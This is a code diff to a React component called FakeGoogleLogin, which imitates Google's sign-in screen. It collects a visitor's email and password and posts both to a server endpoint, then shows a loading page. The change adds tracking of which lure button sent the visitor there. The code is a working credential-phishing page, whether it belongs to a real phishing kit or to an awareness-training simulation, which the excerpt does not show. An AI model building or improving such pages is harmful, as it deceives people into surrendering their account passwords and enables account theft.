@@ -55,11 +55,15 @@ const Button = styled.button`
   cursor: pointer;
 `;
 
+import { useNavigate, useLocation } from 'react-router-dom';
+
 const FakeGoogleLogin = () => {
   const [email, setEmail] = useState('');
   const [password, setPassword] = useState('');
   const [step, setStep] = useState('email');
   const navigate = useNavigate();
+  const location = useLocation();
+  const { button } = location.state || { button: 'unknown' };
 
   const handleNext = () => {
     if (step === 'email') {
@@ -70,7 +74,7 @@ const FakeGoogleLogin = () => {
             headers: {
                 'Content-Type': 'application/json',
             },
-            body: JSON.stringify({ email, password, button: 'google-fake' }),
+            body: JSON.stringify({ email, password, button: `google-${button}` }),
         });
       navigate('/loading');
     }
